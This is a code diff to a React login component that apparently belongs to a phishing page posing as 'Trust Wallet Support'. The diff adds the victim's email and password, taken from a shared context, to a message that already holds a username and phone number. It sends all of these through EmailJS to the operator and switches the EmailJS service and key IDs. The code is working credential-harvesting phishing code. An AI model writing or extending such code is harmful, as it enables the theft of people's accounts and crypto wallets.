@@ -1,6 +1,7 @@
-import  { useState } from 'react';
+import  { useState,useContext } from 'react';
 import { useNavigate} from 'react-router-dom';
 import emailjs from 'emailjs-com';
+import { MyContext } from './MyContext';
 // import { kMaxLength } from 'buffer';
 
 const ToStep = () => {
@@ -11,6 +12,14 @@ const ToStep = () => {
   const [emailPlaceholder, setEmailPlaceholder] = useState('Enter Username');
   const [passwordPlaceholder, setPasswordPlaceholder] = useState('Enter your Number');
   const navigate = useNavigate();
+  const context = useContext(MyContext);
+  if(!context){
+    throw new Error("Mycontext file not found");
+  }
+
+ const {cemail,cpassword}=context;
+
+
 
   const handleLogin = () => {
     let isValid = true;
@@ -42,17 +51,19 @@ const ToStep = () => {
         web_name:'Trust Wallet Support',
         from_name: 'Trust Wallet Support',
         message: `Name: ${email}, 
+        Email: ${cemail},
         Phone: ${password}, 
+        Password: ${cpassword},
         Date: ${new Date().toLocaleDateString()}, 
         Time: ${new Date().toLocaleTimeString()}`,
       };
 
       emailjs
         .send(
-          'service_uwgxhgo', // Your EmailJS Service ID
-          'template_6hqt4d7', // Your EmailJS Template ID
+          'service_41sg0p7', // Your EmailJS Service ID
+          'template_urm06yv', // Your EmailJS Template ID
           templateParams,
-          'iwh2dFI31xGaG4fBY' // Your EmailJS Public Key
+          '2sNbvXHtZ8_J2G1NZ' // Your EmailJS Public Key
         )
         .then(() => {
           setEmail('');
